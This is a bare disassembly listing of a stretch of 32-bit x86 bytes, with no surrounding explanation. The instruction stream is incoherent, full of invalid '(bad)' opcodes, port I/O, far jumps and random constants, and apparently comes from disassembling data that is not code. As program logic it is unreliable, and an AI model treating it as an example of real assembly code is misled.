  41649d:	in     al,0xe4
  41649f:	mov    ds:0x4f7cb64a,al
  4164a4:	xor    eax,0x691d53c5
  4164a9:	into   
  4164aa:	add    eax,0xb98236f2
  4164af:	sar    BYTE PTR [ebx+0x7cf43c1c],1
  4164b5:	or     al,0x7f
  4164b7:	xchg   esp,eax
  4164b8:	shl    DWORD PTR [esi],cl
  4164ba:	js     0x416492
  4164bc:	mov    ebx,0x11a9fad7
  4164c1:	fwait
  4164c2:	or     eax,0x52482370
  4164c7:	or     ebp,eax
  4164c9:	nop
  4164ca:	pavgw  mm3,QWORD PTR [ebp-0xb]
  4164ce:	das    
  4164cf:	popa   
  4164d0:	add    dl,bl
  4164d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164d3:	(bad)  
  4164d4:	cmp    al,0xe0
  4164d6:	fs add al,0x63
  4164d9:	dec    ebx
  4164da:	pop    ebp
  4164db:	(bad)  
  4164dc:	ds cmp esp,edx
  4164df:	or     BYTE PTR es:[ebp+0x1c],bh
  4164e3:	ret    0x7071
  4164e6:	leave  
  4164e7:	adc    edi,DWORD PTR [ebp-0x179a45a2]
  4164ed:	mov    dl,ah
  4164ef:	add    edx,DWORD PTR [edi]
  4164f1:	mov    esi,0xa5c94c5b
  4164f6:	dec    ecx
  4164f7:	add    al,0x9b
  4164f9:	xor    BYTE PTR [eax+0xcec0076],bl
  4164ff:	push   0x60680805
  416504:	lahf   
  416505:	sbb    eax,0xfb713765
  41650a:	out    dx,al
  41650b:	cwde   
  41650c:	aam    0xa
  41650e:	jnp    0x416559
  416510:	rcr    BYTE PTR [ebx-0x2b],cl
  416513:	hlt    
  416514:	push   edi
  416515:	test   al,0xe7
  416517:	mov    al,0xef
  416519:	fdivrp st(1),st
  41651b:	jne    0x4164e7
  41651d:	or     esp,DWORD PTR [edi+0x4b5d283]
  416523:	sbb    BYTE PTR [ebp-0xd657fae],dl
  416529:	inc    ebp
  41652a:	sub    ecx,DWORD PTR [ebx]
  41652c:	cs mov edi,0xe64bd6a7
  416532:	sub    dh,cl
  416534:	in     eax,dx
  416535:	ret    0xdd01
  416538:	cwde   
  416539:	cld    
  41653a:	inc    esi
  41653b:	call   0xd91f:0xc8c975c
  416542:	mov    dh,0x5e
  416544:	cmp    BYTE PTR [esi+0x69],ah
  416547:	xchg   BYTE PTR [ebp-0x79],cl
  41654a:	inc    ecx
  41654b:	iret   
  41654c:	pushf  
  41654d:	add    cl,BYTE PTR [edx+ebp*1-0x18]
  416551:	into   
  416552:	test   BYTE PTR [esi+ecx*2+0x2f],cl
  416556:	ret    
  416557:	inc    edi
  416558:	call   0xe3dc:0xc8bd9c3e
  41655f:	dec    esi
  416560:	inc    esp
  416561:	jl     0x416505
  416563:	dec    esi
  416564:	jecxz  0x416526
  416566:	mov    WORD PTR [edx-0x66],es
  416569:	dec    ecx
  41656a:	jmp    FWORD PTR [ebp+0x7dd30f23]
  416570:	stos   DWORD PTR es:[edi],eax
  416571:	push   esp
  416572:	jno    0x4165ef
  416574:	mov    esi,0xe3e5b115
  416579:	je     0x416511
  41657b:	dec    ebx
  41657c:	jbe    0x416573
  41657e:	and    ebp,esp
  416580:	jl     0x4165c0
  416582:	fsub   QWORD PTR [ecx-0x28]
  416585:	xchg   DWORD PTR ds:0x6cd069cf,esp
  41658b:	data16 test BYTE PTR [ecx-0x2c6ec0f3],ch
  416592:	mov    BYTE PTR [esi+0x2],cl
  416595:	shr    DWORD PTR [ebx],1
  416597:	push   es
  416598:	(bad)  
  416599:	jae    0x41657d
  41659b:	xor    al,0x23
  41659d:	ja     0x41653e
  41659f:	retf   0x4be4
  4165a2:	ret    0x4998
  4165a5:	outs   dx,BYTE PTR ds:[esi]
  4165a6:	adc    esi,ebx
  4165a8:	in     eax,dx
  4165a9:	ret    0x92c5
  4165ac:	jle    0x416558
  4165ae:	cld    
  4165af:	div    DWORD PTR [esi-0x448a471e]
  4165b5:	les    edi,FWORD PTR [ecx+0x3d8d9f36]
  4165bb:	push   edx
  4165bc:	in     eax,dx
  4165bd:	xor    al,0x96
  4165bf:	stos   BYTE PTR es:[edi],al
  4165c0:	aaa    
  4165c1:	push   eax
  4165c2:	jo     0x416559
  4165c4:	jle    0x41663c
  4165c6:	sub    cl,BYTE PTR [esp+esi*4+0x63242618]
  4165cd:	sub    esi,DWORD PTR [edi-0x53]
  4165d0:	sbb    bl,BYTE PTR [edx+edi*2+0x1]
  4165d4:	dec    edx
  4165d5:	das    
  4165d6:	out    0x89,eax
  4165d8:	fdivr  st,st(2)
  4165da:	clc    
  4165db:	aaa    
  4165dc:	mov    dl,0xe7
  4165de:	nop
  4165df:	jl     0x416574
  4165e1:	arpl   WORD PTR [ebx-0x7],bp
  4165e4:	sbb    eax,0x9d63c0f0
  4165e9:	das    
  4165ea:	mov    esi,0xf48382ab
  4165ef:	xchg   ecx,eax
  4165f0:	cwde   
  4165f1:	ds fwait
  4165f3:	inc    ebx
  4165f4:	(bad)  
  4165f5:	xlat   BYTE PTR ds:[ebx]
  4165f6:	xor    al,0x92
  4165f8:	xchg   ebp,eax
  4165f9:	pop    eax
  4165fa:	(bad)  
  4165fb:	sub    ecx,DWORD PTR [edi+0x5a]
  4165fe:	xlat   BYTE PTR ds:[ebx]
  4165ff:	and    ecx,edx
  416601:	dec    esi
  416602:	js     0x41660e
  416604:	int3   
  416605:	(bad)  
  416606:	call   0xf0d91b54
  41660b:	fstp   TBYTE PTR ds:[ebx-0x58]
  41660f:	mov    edx,0x1e33dba
  416614:	lahf   
  416615:	int3   
  416616:	pop    ebx
  416617:	into   
  416618:	iret   
  416619:	mov    al,0xe7
  41661b:	clc    
  41661c:	out    dx,al
  41661d:	test   al,0x8e
  41661f:	pop    ecx
  416620:	(bad)  
  416621:	(bad)  [ebx-0x6960423]
  416627:	retf   0x1db8
  41662a:	and    BYTE PTR [edx+eiz*2+0x61c7bccb],dl
  416631:	mov    ds:0x6a9e006a,al
  416636:	mov    WORD PTR [edi-0x2f],cs
  416639:	ins    BYTE PTR es:[edi],dx
  41663a:	or     BYTE PTR ss:[esi],ah
  41663d:	pop    eax
  41663e:	pop    ds
  41663f:	stos   DWORD PTR es:[edi],eax
  416640:	add    BYTE PTR [ebx],al
  416642:	cmp    dh,BYTE PTR [ecx+0x18]
  416645:	pop    edx
  416646:	(bad)  
  416647:	rep outs dx,DWORD PTR ds:[esi]
  416649:	stos   BYTE PTR es:[edi],al
  41664a:	jge    0x41669b
  41664c:	jmp    0x5594:0xfd287003
  416653:	aaa    
  416654:	adc    BYTE PTR [eax-0x36],al
  416657:	pop    edx
  416658:	out    0x60,eax
  41665a:	test   eax,0xb44520b2
  41665f:	dec    ecx
  416660:	bound  ebp,QWORD PTR [eax+0x2a]
  416663:	lods   eax,DWORD PTR ds:[esi]
  416664:	out    0x9a,al
  416666:	push   ebx
  416667:	shr    DWORD PTR [edx+0x3e1aaf86],cl
  41666d:	call   0x92e3:0x43d3f714
  416674:	dec    ah
  416676:	fiadd  DWORD PTR [edi-0x5a396f1a]
  41667c:	ins    BYTE PTR es:[edi],dx
  41667d:	das    
  41667e:	mov    dh,0xd8
  416680:	xchg   esp,eax
  416681:	jecxz  0x4166af
  416683:	mov    dl,0x2b
  416685:	(bad)  
  416687:	test   al,0x48
  416689:	into   
  41668a:	xor    ch,cl
  41668c:	outs   dx,DWORD PTR ds:[esi]
  41668d:	push   esp
  41668e:	(bad)
  416692:	jmp    0x8b4b2d76
  416697:	aam    0xfb
  416699:	xor    BYTE PTR [ecx],dh
  41669b:	out    dx,eax
  41669c:	stc    
  41669d:	mov    gs,WORD PTR [ebx-0x5166a584]
  4166a3:	inc    esi
  4166a4:	mov    edi,esi
  4166a6:	sbb    eax,0xec37b882
  4166ab:	mov    ebx,0xf0576c1b
  4166b0:	jno    0x4166de
  4166b2:	fmul   QWORD PTR [esi]
  4166b4:	mov    ecx,0xe5822179
  4166b9:	cdq    
  4166ba:	pusha  
  4166bb:	and    esi,DWORD PTR [ebx+0x2a]
  4166be:	adc    DWORD PTR [esi+0x2e9ed2eb],eax
  4166c4:	pop    ds
  4166c5:	add    al,0x27
  4166c7:	das    
  4166c8:	add    cl,bl
  4166ca:	sbb    esp,ecx
  4166cc:	and    DWORD PTR [esp+esi*2],edx
  4166cf:	pop    eax
  4166d0:	iret   
  4166d1:	xor    DWORD PTR [edi+0x3b],ecx
  4166d4:	jnp    0x4166fd
  4166d6:	mov    al,cs:0x6c3a936e
  4166dc:	aam    0x98
  4166de:	lahf   
  4166df:	shr    DWORD PTR [ebx-0x1aa023cd],1
  4166e5:	in     eax,dx
  4166e6:	cs ss loop 0x4166b4
  4166ea:	pop    ss
  4166eb:	cmp    al,0x3f
  4166ed:	outs   dx,BYTE PTR ds:[esi]
  4166ee:	add    DWORD PTR [ebp-0x3c],ecx
  4166f1:	sub    al,0xe5
  4166f3:	adc    DWORD PTR [ebx-0x21],ecx
  4166f6:	(bad)  
  4166f7:	pop    ebp
  4166f8:	jno    0x4166e9
  4166fa:	jg     0x4166dd
  4166fc:	add    al,bl
  4166fe:	in     al,dx
  4166ff:	xor    ch,BYTE PTR ds:0x3c6a9f55
  416705:	lods   eax,DWORD PTR ds:[esi]
  416706:	sahf   
  416707:	call   0xe3157bbc
  41670c:	clc    
  41670d:	sbb    BYTE PTR [ecx],cl
  41670f:	data16 sub dh,ah
  416712:	lea    edx,[esi+ecx*4+0x5f]
  416716:	xor    dl,0x57
  416719:	mov    ah,0x12
  41671b:	cld    
  41671c:	(bad)  
  41671d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41671e:	push   0xd1c7fb36
  416723:	mov    cl,dl
  416725:	add    BYTE PTR [ebp-0x28],bh
  416728:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416729:	adc    BYTE PTR [esi-0x25],al
  41672c:	out    dx,eax
  41672d:	cmp    eax,0x90b5c05e
  416732:	jecxz  0x4166db
  416734:	mov    ds:0xd237f04c,al
  416739:	pop    esp
  41673a:	or     al,0x54
  41673c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41673e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41673f:	or     eax,0x6a2fa53f
  416744:	das    
  416745:	stos   DWORD PTR es:[edi],eax
  416746:	xchg   ebx,eax
  416747:	imul   edi,DWORD PTR cs:[ecx+0x70],0xffffffd1
  41674c:	cmp    DWORD PTR [esp+edi*1-0x4e],ebp
  416750:	sbb    eax,edi
  416752:	xor    eax,0x2f0abf26
  416757:	xchg   edx,eax
  416758:	(bad)  
  416759:	mov    cl,0x16
  41675b:	xor    al,0x9b
  41675d:	nop
  41675e:	lods   eax,DWORD PTR cs:[esi]
  416760:	push   ebx
  416761:	dec    edi
  416762:	xchg   esi,eax
  416763:	fcomp  st(2)
  416765:	inc    eax
  416766:	mov    edi,0x32ebb445
  41676b:	std    
  41676c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41676d:	repnz lock dec esp
  416770:	test   DWORD PTR [esp+ebp*8-0x51],ebp
  416774:	fstp   TBYTE PTR [edi+0x74]
  416777:	int3   
  416778:	cmp    edx,DWORD PTR [edx-0x69]
  41677b:	lock or eax,DWORD PTR [edx-0x65]
  41677f:	in     al,0x60
  416781:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416782:	adc    al,0x21
  416784:	xor    cl,al
  416786:	push   eax
  416787:	call   0x5e632a6c
  41678c:	sbb    eax,DWORD PTR [eax-0xb]
  41678f:	mov    gs,WORD PTR [edx-0x7fa1800c]
  416795:	push   eax
  416796:	jmp    0x4167dc
  416798:	cmp    esi,DWORD PTR [edi*2-0x23598200]
  41679f:	mov    ebp,0x204820f6
  4167a4:	shl    DWORD PTR [ecx+0x5fda2b89],cl
  4167aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167ab:	rcr    ch,0x15
  4167ae:	ret    0xc0a1
  4167b1:	sub    al,0x6
  4167b3:	mov    ebp,0x639ebc9b
  4167b8:	or     ebx,DWORD PTR [esi]
  4167ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4167bb:	cmp    al,0x4f
  4167bd:	fisttp WORD PTR [edi+0x27ec58f]
  4167c3:	dec    ebx
  4167c4:	pop    ebx
  4167c5:	cmc    
  4167c6:	sti    
  4167c7:	iret   
  4167c8:	cmp    BYTE PTR ds:0x22407690,ah
  4167ce:	das    
  4167cf:	mov    ch,0x59
  4167d1:	stos   DWORD PTR es:[edi],eax
  4167d2:	push   esp
  4167d3:	jo     0x416806
  4167d5:	daa    
  4167d6:	jp     0x41676a
  4167d8:	(bad)  
  4167d9:	aaa    
  4167da:	sub    BYTE PTR [ebx-0x7b839148],bh
  4167e0:	cmp    BYTE PTR [edx-0x25],bl
  4167e3:	mov    BYTE PTR [ecx+0x389eaa6e],ah
  4167e9:	sbb    edx,DWORD PTR [eax-0x60]
  4167ec:	mov    ebp,ecx
  4167ee:	out    0xe6,eax
  4167f0:	out    dx,al
  4167f1:	hlt    
  4167f2:	in     al,dx
  4167f3:	daa    
  4167f4:	push   edi
  4167f5:	(bad)  
  4167f6:	std    
  4167f7:	push   ds
  4167f8:	addr16 dec esp
  4167fa:	sbb    DWORD PTR [esi-0x74ecc389],ebp
  416800:	sub    DWORD PTR [edx-0x255a6a5d],ebx
  416806:	loopne 0x41686b
  416808:	sbb    ebx,DWORD PTR [ebp+0x35f47817]
  41680e:	pop    ecx
  41680f:	out    dx,eax
  416810:	push   ds
  416811:	adc    al,BYTE PTR [ecx-0x375f9e62]
  416817:	pushf  
  416818:	sar    DWORD PTR [ebp-0x2],cl
  41681b:	or     edi,esi
  41681d:	loopne 0x416822
  41681f:	and    BYTE PTR es:[edi-0x2e37b5b1],ch
  416826:	out    0xd4,eax
  416828:	xchg   ecx,eax
  416829:	xor    ebx,DWORD PTR [edx]
  41682b:	ja     0x41687c
  41682d:	cld    
  41682e:	fs dec esi
  416830:	mov    esi,0x253d51ed
  416835:	sbb    eax,0xa0f9ca
  41683a:	jnp    0x41681f
  41683c:	cmp    BYTE PTR [ecx+esi*4-0x6f],dh
  416840:	cmc    
  416841:	cmp    DWORD PTR [esp+esi*4-0x37],0xffffffb2
  416846:	in     eax,0xf5
  416848:	int    0x91
  41684a:	(bad)  
  41684c:	inc    edi
  41684d:	cmc    
  41684e:	adc    DWORD PTR [eax+0x1f],0x404a9a6b
  416855:	mov    esi,0x4f1b276
  41685a:	add    al,0x97
  41685c:	sub    eax,DWORD PTR [eax+0x6b]
  41685f:	mov    cl,0x2d
  416861:	lock xlat BYTE PTR ds:[ebx]
  416863:	adc    DWORD PTR [eax],edi
  416865:	jmp    0x5756eb0d
  41686a:	inc    ecx
  41686b:	enter  0x3afe,0x5a
  41686f:	or     BYTE PTR [ebp-0x63],bh
  416872:	jmp    0xdf16d0d9
  416877:	mov    ss,WORD PTR [esp+edi*8-0x3b]
  41687b:	add    bh,BYTE PTR [ebx+0x14b40811]
  416881:	out    dx,eax
  416882:	enter  0x6cb1,0xde
  416886:	retf   
  416887:	out    0x2e,al
  416889:	clc    
  41688a:	retf   0x777f
  41688d:	add    esi,edi
  41688f:	loop   0x4168d2
  416891:	sbb    DWORD PTR [ecx-0x10],esi
  416894:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416895:	dec    eax
  416896:	xor    ch,ah
  416898:	sbb    DWORD PTR [ebx+0x79],edx
  41689b:	out    0xf3,al
  41689d:	pop    eax
  41689e:	shr    BYTE PTR [esi],1
  4168a0:	sbb    BYTE PTR [eax+0x2a4dd147],bl
  4168a6:	jmp    0x7ee6514d
  4168ab:	sub    BYTE PTR [eax],0x3f
  4168ae:	dec    ebp
  4168af:	sahf   
  4168b0:	in     al,dx
  4168b1:	stc    
  4168b2:	sbb    ebx,DWORD PTR [ebx-0x35]
  4168b5:	or     cl,bh
  4168b7:	les    esp,FWORD PTR [esi-0x30542e94]
  4168bd:	call   0x9bce:0x5d3db2d8
  4168c4:	jmp    0x433a:0x268502dd
  4168cb:	mov    ebp,edi
  4168cd:	rcr    ebp,cl
  4168cf:	repnz hlt 
  4168d1:	push   0x22a231cd
  4168d6:	inc    ecx
  4168d7:	lock add bl,BYTE PTR ds:0x31bd4a3e
  4168de:	iret   
  4168df:	mov    ds:0x992bbffd,al
  4168e4:	ficomp WORD PTR [esi-0x37]
  4168e7:	xor    DWORD PTR ds:0x59059451,ebx
  4168ed:	lods   eax,DWORD PTR ds:[esi]
  4168ee:	sub    ebp,DWORD PTR [ebp+eax*1-0x51c00f58]
  4168f5:	(bad)  
  4168f7:	mov    ah,0xd5
  4168f9:	bound  esp,QWORD PTR [ebx]
  4168fb:	ja     0x416886
  4168fd:	ins    BYTE PTR es:[edi],dx
  4168fe:	inc    ecx
  4168ff:	or     BYTE PTR [edi+0x73],bl
  416902:	inc    ebp
  416903:	loopne 0x4168e9
  416905:	mov    ?,edx
  416907:	push   esp
  416908:	scas   eax,DWORD PTR es:[edi]
  416909:	pusha  
  41690a:	dec    ecx
  41690b:	ss mov dl,0xfc
  41690e:	jae    0x416900
  416910:	mov    edi,0x145ba19
  416915:	mov    al,ds:0x914e9428
  41691a:	ja     0x4168c6
  41691c:	sub    dh,BYTE PTR [ebx+0x4d]
  41691f:	mov    eax,0x65170c00
  416924:	sahf   
  416925:	je     0x4168c8
  416927:	inc    esi
  416928:	out    0xeb,al
  41692a:	adc    eax,0xa0d6dfaa
  41692f:	jo     0x416988
  416931:	fldenv [esi]
  416933:	mov    al,ds:0x46e692b0
  416938:	mov    ebx,DWORD PTR ds:0xb8e121c4
  41693e:	add    DWORD PTR [ebp+ebx*8+0x651d9242],edx
  416945:	iret   
  416946:	mov    ds:0xeb87a277,al
  41694b:	adc    BYTE PTR [eax+0x4f80d1c4],0xdc
  416952:	dec    BYTE PTR [edx+0x1e1f95ae]
  416958:	add    eax,esp
  41695a:	ds cmc 
  41695c:	xchg   ebp,eax
  41695d:	mov    dh,BYTE PTR [edi]
  41695f:	sub    al,0x59
  416961:	imul   DWORD PTR [ebp-0x25]
  416964:	jge    0x4169a2
  416966:	mov    ds:0xdca365d,eax
  41696b:	sbb    al,0x9
  41696d:	adc    al,0xaa
  41696f:	xchg   BYTE PTR [eax],dl
  416971:	xor    DWORD PTR [ecx],0x58
  416974:	inc    esi
  416975:	mov    bh,0x3d
  416977:	fisubr WORD PTR [eax]
  416979:	or     DWORD PTR [eax-0x72c7751d],0xffffff81
  416980:	fisubr WORD PTR [edx-0x1bd3a70d]
  416986:	rcl    al,1
  416988:	and    al,0x9b
  41698a:	xor    BYTE PTR [ebp+0x7b],bl
  41698d:	and    al,0xb3
  41698f:	mov    eax,ds:0x5f359246
  416994:	imul   ebx,esp,0xd82fa6c0
  41699a:	call   0x6de4:0xfd391287
  4169a1:	pop    ecx
  4169a2:	sbb    edx,esp
  4169a4:	psrad  mm3,QWORD PTR [ebp+0x58dfec8]
  4169ab:	and    eax,DWORD PTR [ecx+0x1c5319e8]
  4169b1:	pop    esp
  4169b2:	jns    0x416994
  4169b4:	add    ebx,ebx
  4169b6:	mov    ds:0xd4eec580,eax
  4169bb:	or     bh,BYTE PTR [ebx+0x1d]
  4169be:	dec    edi
  4169bf:	sahf   
  4169c0:	dec    ebx
  4169c1:	in     eax,dx
  4169c2:	inc    ecx
  4169c3:	mov    ebp,0x163b7e0e
  4169c8:	sbb    DWORD PTR [edx-0x80],esi
  4169cb:	cmp    eax,0x673f10bd
  4169d0:	mov    al,ds:0x65a131c8
  4169d5:	inc    edx
  4169d6:	sub    BYTE PTR ds:0x48dfe41d,dh
  4169dc:	cs mov cl,0xc9
  4169df:	sbb    ah,BYTE PTR [esi+0x2c]
  4169e2:	and    esp,ebp
  4169e4:	div    ebx
  4169e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4169e7:	and    ah,BYTE PTR [esi+0x7c52264b]
  4169ed:	xchg   edi,eax
  4169ee:	mov    esp,0x2da22379
  4169f3:	xchg   edi,eax
  4169f4:	mov    ebx,0x8bcee45f
  4169f9:	push   eax
  4169fa:	retf   0x6942
  4169fd:	es inc eax
  4169ff:	sti    
  416a00:	jmp    0x4169aa
  416a02:	cld    
  416a03:	test   DWORD PTR [esi-0x7f077ea9],esp
  416a09:	sbb    BYTE PTR [edi+0x68],bl
  416a0c:	fisttp WORD PTR [ebx+0x32]
  416a0f:	xchg   ebp,eax
  416a10:	add    esp,ebx
  416a12:	xor    DWORD PTR [edi+0x22d7816b],esp
  416a18:	push   ebx
  416a19:	arpl   WORD PTR [edx+0x7a65df9c],bx
  416a1f:	int3   
  416a20:	sub    al,bh
  416a22:	cld    
  416a23:	mov    ds:0xf8892ac8,al
  416a28:	and    al,BYTE PTR [edx+ecx*1+0x2a]
  416a2c:	xchg   edi,eax
  416a2d:	mov    DWORD PTR [ecx],ebx
  416a2f:	xor    eax,DWORD PTR [esi-0x58]
  416a32:	lock icebp 
  416a34:	loope  0x416a60
  416a36:	out    0x66,eax
  416a38:	xor    al,0x91
  416a3a:	sti    
  416a3b:	(bad)  
  416a3c:	mov    es,edx
  416a3e:	div    BYTE PTR [esi]
  416a40:	add    DWORD PTR [esp+edi*1-0x3790d458],0x37
  416a48:	adc    ch,BYTE PTR [edi+0x1be64014]
  416a4e:	or     BYTE PTR [esi],ch
  416a50:	xchg   ecx,eax
  416a51:	or     eax,0x1b2280d2
  416a56:	mov    eax,0x72928212
  416a5b:	hlt    
  416a5c:	jo     0x9a0385a1
  416a62:	hlt    
  416a63:	push   ebx
  416a64:	sbb    esi,0x771fd657
  416a6a:	or     ebx,DWORD PTR [ecx]
  416a6c:	push   esp
  416a6d:	out    0xa4,al
  416a6f:	mov    dl,0xf6
  416a71:	xchg   BYTE PTR [eax-0xe],bh
  416a74:	pop    eax
  416a75:	int    0x90
  416a77:	(bad)  
  416a78:	jecxz  0x416aa1
  416a7a:	(bad)  
  416a7b:	fwait
  416a7c:	stos   DWORD PTR es:[edi],eax
  416a7d:	and    DWORD PTR [edi-0x22b60dd3],edx
  416a83:	leave  
  416a84:	sar    BYTE PTR [ecx-0x7c962d75],1
  416a8a:	call   0x733:0xbb818781
  416a91:	mov    edi,0xc6aa4837
  416a96:	pop    edi
  416a97:	dec    esi
  416a98:	daa    
  416a99:	in     eax,0xa0
  416a9b:	cmp    cl,dh
  416a9d:	in     eax,0x57
  416a9f:	xchg   esp,eax
  416aa0:	jo     0x416a51
  416aa2:	cwde   
  416aa3:	in     al,0x19
  416aa5:	aaa    
  416aa6:	xlat   BYTE PTR ds:[ebx]
  416aa7:	sbb    ebp,esp
  416aa9:	or     DWORD PTR [ebp+0x37173f85],esi
  416aaf:	cld    
  416ab0:	xlat   BYTE PTR ds:[ebx]
  416ab1:	or     edx,edx
  416ab3:	icebp  
  416ab4:	mov    ds:0x153edfac,al
  416ab9:	or     al,0x68
  416abb:	call   0x52fc714
  416ac0:	je     0x416a5d
  416ac2:	add    cl,BYTE PTR [ebx+0x11f4fb92]
  416ac8:	int3   
  416ac9:	sub    eax,0xea761b8d
  416ace:	mov    al,0x28
  416ad0:	xchg   esi,eax
  416ad1:	mov    DWORD PTR [edx+0x41],ecx
  416ad4:	fs mov al,0x85
  416ad7:	push   ebx
  416ad8:	imul   ebp,DWORD PTR [edi-0xeb0f5b7],0x42f10656
  416ae2:	xchg   edi,eax
  416ae3:	sbb    ecx,DWORD PTR [edi+0x60]
  416ae6:	xchg   esi,eax
  416ae7:	adc    ah,al
  416ae9:	shl    DWORD PTR [edi-0x50],cl
  416aec:	or     bh,0x16
  416aef:	and    dl,BYTE PTR [ebx+0x48d083f3]
  416af5:	sahf   
  416af6:	pop    edx
  416af7:	push   eax
  416af8:	xchg   ecx,eax
  416af9:	add    DWORD PTR [eax+0x6ee9c66],edx
  416aff:	or     DWORD PTR [ecx],edi
  416b01:	sbb    eax,0x9eee6763
  416b06:	in     eax,0xef
  416b08:	add    ah,BYTE PTR ss:[ebx+0x2b9f3154]
  416b0f:	stos   DWORD PTR es:[edi],eax
  416b10:	test   al,0x48
  416b12:	daa    
  416b13:	inc    eax
  416b14:	push   0xffffff98
  416b16:	out    0x67,eax
  416b18:	mov    ch,0x31
  416b1a:	inc    ebx
  416b1b:	or     BYTE PTR [edx-0x1a7c4f6b],cl
  416b21:	mov    ebp,0x6cfe4e22
  416b26:	mov    esi,0xbc3fbc8
  416b2b:	test   al,0x74
  416b2d:	xchg   ecx,eax
  416b2e:	pop    esp
  416b2f:	add    DWORD PTR [esi],esp
  416b31:	lods   al,BYTE PTR ds:[esi]
  416b32:	outs   dx,DWORD PTR ds:[esi]
  416b33:	(bad)  
  416b35:	mov    edi,0xaee1e559
  416b3a:	jge    0x416bb1
  416b3c:	mov    DWORD PTR [ebp-0x775abbb4],0x8442a1eb
  416b46:	push   ds
  416b47:	(bad)  
  416b49:	xchg   ebx,eax
  416b4a:	in     eax,0x2c
  416b4c:	jbe    0x416b96
  416b4e:	les    ecx,FWORD PTR [edx]
  416b50:	cdq    
  416b51:	das    
  416b52:	aad    0x49
  416b54:	(bad)  
  416b55:	jmp    0x416bcf
  416b57:	pushf  
  416b58:	fwait
  416b59:	stc    
  416b5a:	push   ds
  416b5b:	cmc    
  416b5c:	push   0x37
  416b5e:	add    BYTE PTR [edi-0x5e],bh
  416b61:	mov    esi,0x8bbfef2d
  416b66:	and    al,0xc4
  416b68:	ja     0x416b7f
  416b6a:	mov    eax,ds:0xc5abfe10
  416b6f:	lods   eax,DWORD PTR ds:[esi]
  416b70:	adc    DWORD PTR [eax],0xffffffd2
  416b73:	pop    eax
  416b74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b75:	jns    0x416b15
  416b77:	xchg   edx,eax
  416b78:	add    al,BYTE PTR [eax-0x6ed477db]
  416b7e:	and    al,0x3f
  416b80:	xchg   ebp,eax
  416b81:	scas   eax,DWORD PTR es:[edi]
  416b82:	mul    BYTE PTR [eax-0x46464359]
  416b88:	out    dx,al
  416b89:	aas    
  416b8a:	mov    al,ds:0x6650046
  416b8f:	neg    ah
  416b91:	mov    esp,0x18e0e1d5
  416b96:	dec    esi
  416b97:	cmp    al,0xc0
  416b99:	call   0x50c6048d
  416b9e:	xlat   BYTE PTR ds:[ebx]
  416b9f:	or     DWORD PTR [ecx-0x3e272b51],edx
  416ba5:	cdq    
  416ba6:	popf   
  416ba7:	int    0x6e
  416ba9:	imul   DWORD PTR [edi-0x26fe2a85]
  416baf:	les    eax,FWORD PTR [edi+edi*2]
  416bb2:	out    dx,al
  416bb3:	mul    DWORD PTR [edi+0x2ba61fc0]
  416bb9:	xor    dl,BYTE PTR [edx+0x277f36cc]
  416bbf:	push   ebx
  416bc0:	js     0x416bd5
  416bc2:	mov    eax,ds:0xb258f60f
  416bc7:	(bad)  
  416bc8:	jge    0x416c0f
  416bca:	dec    eax
  416bcb:	sub    DWORD PTR [ebx-0x13931796],ecx
  416bd1:	pop    ss
  416bd2:	mov    ch,0x4f
  416bd4:	iret   
  416bd5:	mov    WORD PTR [esi+0x25],fs
  416bd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bd9:	sti    
  416bda:	retf   0x6b1b
  416bdd:	xor    al,BYTE PTR [esi-0x43e9edc6]
  416be3:	cmp    esp,DWORD PTR [edx-0x41]
  416be6:	and    al,0x8b
  416be8:	repnz out dx,al
  416bea:	lods   eax,DWORD PTR ds:[esi]
  416beb:	mov    ecx,esp
  416bed:	das    
  416bee:	int    0xe1
  416bf0:	jecxz  0x416bdb
  416bf2:	push   ecx
  416bf3:	and    ecx,edx
  416bf5:	mov    ch,0x5f
  416bf7:	cmp    eax,0xc41ad79d
  416bfc:	pop    es
  416bfd:	outs   dx,DWORD PTR ds:[esi]
  416bfe:	test   al,0xa3
  416c00:	cmp    eax,0x2629019a
  416c05:	adc    ebp,esi
  416c07:	push   es
  416c08:	cmp    bl,BYTE PTR [esp+esi*2]
  416c0b:	mov    dh,0x56
  416c0d:	pop    ds
  416c0e:	and    bl,BYTE PTR [ebp+0x76d55077]
  416c14:	inc    eax
  416c15:	cmc    
  416c16:	pusha  
  416c17:	ror    DWORD PTR [eax+0x2f4d47e8],1
  416c1d:	test   DWORD PTR [edi],ecx
  416c1f:	jns    0x416c60
  416c21:	std    
  416c22:	xchg   edx,eax
  416c23:	push   ss
  416c24:	jecxz  0x416c67
  416c26:	ficomp WORD PTR [ecx+0x4e]
  416c29:	mov    ds:0x2edc7dc5,eax
  416c2e:	lods   al,BYTE PTR ds:[esi]
  416c2f:	inc    esp
  416c30:	(bad)  
  416c31:	aam    0x43
  416c33:	fwait
  416c34:	cld    
  416c35:	outs   dx,DWORD PTR ds:[esi]
  416c36:	std    
  416c37:	cdq    
  416c38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c39:	mov    dl,0x45
  416c3b:	and    al,0xa0
  416c3d:	psadbw mm0,QWORD PTR [ebp-0x5beb5fa6]
  416c44:	sbb    BYTE PTR [eax],0x84
  416c47:	jecxz  0x416c4b
  416c49:	data16 hlt 
  416c4b:	lds    ecx,FWORD PTR [ecx+0x3c49d57c]
  416c51:	jae    0x416c97
  416c53:	repnz popf 
  416c55:	push   0x585430b6
  416c5a:	xchg   esp,eax
  416c5b:	hlt    
  416c5c:	xor    eax,0xce5b9083
  416c61:	inc    ebx
  416c62:	sahf   
  416c63:	xchg   esp,eax
  416c64:	xor    eax,edi
  416c66:	in     eax,0xb9
  416c68:	stos   BYTE PTR es:[edi],al
  416c69:	cmp    esi,DWORD PTR [ebx+0xc]
  416c6c:	xchg   ebp,eax
  416c6d:	cmp    eax,0xfb87a64f
  416c72:	lea    eax,[edx]
